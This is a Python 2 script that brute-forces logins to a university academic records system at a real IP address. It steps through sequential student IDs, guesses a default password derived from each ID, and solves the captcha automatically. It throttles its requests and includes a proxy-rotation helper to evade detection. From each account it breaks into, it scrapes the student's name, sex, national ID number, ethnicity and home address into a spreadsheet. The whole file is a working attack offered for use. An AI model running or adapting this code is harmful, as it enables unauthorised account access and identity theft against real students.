# coding:utf-8
import urllib
import urllib2
import cookielib
import re
import random
import getYZM
import time
from lxml import etree
import Initial
from SaveInfo import save
import termcolor
scTime = 2014172041
Initial.start()#初始化表格

def getReal(info):
    pattern = "[^\s]+"
    real = re.findall(pattern,info,re.S)
    return real[0]
def getRical(allinfo):
    rical = allinfo[10]
    rRical = getReal(rical)
    return rRical
def getAdress(allinfo):
    adress = allinfo[20]
    rAdress = getReal(adress)
    return rAdress
def getIDnum(allinfo):
    IDnum = allinfo[5]
    rIDnum = getReal(IDnum)
    return rIDnum
def getName(allinfo):
    name = allinfo[1]
    rname = getReal(name)
    return rname
def getSex(allinfo):
    sex = allinfo[6]
    rsex = getReal(sex)
    return rsex

def make_un_and_pw():
    userName = 2014172041
    # again = 0
    global scTime
    # url_user_agent()
    while(1):
        pw = ""
        userName+=1
        # if(userName % 80 == 0):
        #     url_user_agent()
        if((userName-scTime)>34):
            yushu = userName%1000
            userName = userName-yushu+1000
            scTime = userName
            termcolor.cprint("学号已加1000!!!",'red')
        sun = str(userName)
        for i in range(4,10):
            pw += sun[i]
        #print pw
        isSuccess(sun,pw,userName)
        # again+=1
        interval = random.uniform(5,8)
        time.sleep(interval)
x=1

def isSuccess(sun,pw,userName):
    global x
    global scTime
    print "the UserName is :"+sun+" the password is :"+pw,
    # 登录的主页面
    hosturl = 'http://218.7.49.53:9003/'     #   自己填写
    # post数据接收和处理的页面（我们要向这个页面发送我们构造的Post数据）
    posturl = 'http://218.7.49.53:9003/loginAction.do' # 从数据包中分析出，处理post请求的url

    # 设置一个cookie处理器，它负责从服务器下载cookie到本地，并且在发送请求时带上本地的cookie
    cj = cookielib.LWPCookieJar()
    cookie_support = urllib2.HTTPCookieProcessor(cj)
    opener = urllib2.build_opener(cookie_support, urllib2.HTTPHandler)
    urllib2.install_opener(opener)

    # 打开登录主页面（他的目的是从页面下载cookie，这样我们在再送post数据时就有cookie了，否则发送不成功）
    h = urllib2.urlopen(hosturl)
    # 构造header，一般header至少要包含一下两项。这两项是从抓到的包里分析得出的。
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko)\
     Chrome/52.0.2743.116 Safari/537.36',
               'Referer': 'http://218.7.49.53:9003/'}
    # 构造Post数据，他也是从抓大的包里分析得出的。
    yzm = getYZM.getCode()
    print "the YZM is :" + yzm
    postData = {
              "zjh": sun,
              "mm": pw,
              "v_yzm": yzm
              }
    # 需要给Post数据编码
    postData = urllib.urlencode(postData)
    # 通过urllib2提供的request方法来向指定Url发送我们构造的数据，并完成登录过程
    request = urllib2.Request(posturl, postData, headers)
    try:
        response = urllib2.urlopen(request)
    except Exception as e:
        print e
        time.sleep(100)
        isSuccess(sun, pw, userName)
    text = response.read()
    pattern = "你输入的验证码(.*?)误"
    pattern=pattern.decode("utf-8").encode("gb2312")
    conf = re.findall(pattern,text,re.S)
    #print conf
    if(conf):
        termcolor.cprint("wrong: 验证码错误,重试中.", 'red')
        interval = random.uniform(5,8)
        time.sleep(interval)
        isSuccess(sun,pw,userName)
    flag = re.findall("frameborder=\"NO(.*?)\"",text,re.S)
    if(flag):
        scTime=userName
        termcolor.cprint("right: 成功获取到一组.", 'green')
        infoUrl = "http://218.7.49.53:9003/xjInfoAction.do?oper=xjxx"
        infoData = urllib2.urlopen(infoUrl)
        infotext = infoData.read()
        selector = etree.HTML(infotext)
        allinfo = selector.xpath('//table[@class="titleTop3"]/tr/td/table[@id="tblView"]/tr/td[@width="275"]/text()')
        name = getName(allinfo)
        sex = getSex(allinfo)
        ID = getIDnum(allinfo)
        rical = getRical(allinfo)
        adress = getAdress(allinfo)
        save(x,0,sun)
        save(x,1,pw)
        save(x,2,name)
        save(x,3,sex)
        save(x,4,ID)
        save(x,5,rical)
        save(x,6,adress)
        x+=1


def url_user_agent():
    #设置使用代理
    proxys = ['112.95.17.72:8118','119.29.228.105:105','182.41.187.70:808','122.0.75.47:82','183.62.58.250:9797','117.9.135.200:9999',\
              '110.73.40.143:8123','113.251.117.235:8123','219.129.28.132:3128']
    sign = random.randint(0,9)
    ips = proxys[sign]
    proxy = {'http':ips}
    proxy_support = urllib2.ProxyHandler(proxy)
    # opener = urllib2.build_opener(proxy_support,urllib2.HTTPHandler(debuglevel=1))
    opener = urllib2.build_opener(proxy_support)
    urllib2.install_opener(opener)

if __name__ == '__main__':
    make_un_and_pw()

